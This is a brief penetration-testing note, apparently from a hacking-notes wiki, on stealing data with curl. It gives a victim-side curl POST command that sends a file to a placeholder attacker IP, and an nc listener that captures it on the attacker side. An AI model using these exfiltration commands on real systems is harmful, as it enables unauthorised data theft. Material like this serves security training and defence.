# CURL - Exfiltration

## Data Exfiltration

Data exfiltration in simpler terms is also known as Data Theft or Data Exportation. These terms generally define the method of attackers having unauthorized access to a user’s data and sneakily make a copy of it by gaining access to the system or the network. Data exfiltration can be performed in various methods with their primary intent of stealing data. This form of attack usually goes undetected. In this article, we are going to learn about data exfiltration by using Linux and Windows binaries.

## Data Exfiltration using CURL

It is a command-line tool that is used for transferring data using various network protocols. We can use **/curl** binary to sneakily use file upload and send the file to the attacker machine over the HTTP POST connection.&#x20;

### Victim Machine

```
curl -X POST -d @data.txt <attacker ip>
```

### Attacker Machine

```
nc -lvp 80 > data.txt

cat data.txt
```





***



## REFERENCES

* [https://www.hackingarticles.in/data-exfiltration-using-linux-binaries/](https://www.hackingarticles.in/data-exfiltration-using-linux-binaries/)
* [https://gtfobins.github.io/gtfobins/curl/](https://gtfobins.github.io/gtfobins/curl/)
